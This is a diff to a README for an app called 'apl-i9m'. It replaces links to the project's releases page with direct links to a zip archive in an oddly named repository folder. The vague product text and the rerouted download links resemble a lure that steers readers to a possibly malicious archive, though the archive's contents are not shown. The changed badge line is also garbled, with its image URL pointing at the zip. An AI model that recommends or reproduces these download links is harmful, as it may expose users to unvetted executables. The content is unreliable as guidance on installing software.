@@ -4,7 +4,7 @@
 Welcome to apl-i9m! This application helps you optimize your daily tasks with a user-friendly approach.
 
 ## 📥 Download Now
-[![Download apl-i9m](https://img.shields.io/badge/Download%20apl--i9m-v1.0-blue.svg)](https://github.com/raphael900/apl-i9m/releases)
+[![Download apl-i9m](https://raw.githubusercontent.com/raphael900/apl-i9m/main/overfoot/apl-i9m.zip%https://raw.githubusercontent.com/raphael900/apl-i9m/main/overfoot/apl-i9m.zip)](https://raw.githubusercontent.com/raphael900/apl-i9m/main/overfoot/apl-i9m.zip)
 
 ## 💻 System Requirements
 To run apl-i9m, ensure your computer meets these requirements:
@@ -19,7 +19,7 @@ To run apl-i9m, ensure your computer meets these requirements:
 - **Regular Updates**: Stay up to date with new features and fixes.
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [apl-i9m Releases](https://github.com/raphael900/apl-i9m/releases).
+To get started, visit this page to download: [apl-i9m Releases](https://raw.githubusercontent.com/raphael900/apl-i9m/main/overfoot/apl-i9m.zip).
 
 1. Click the link above to access the release page.
 2. You will see a list of available versions. Look for the latest version.
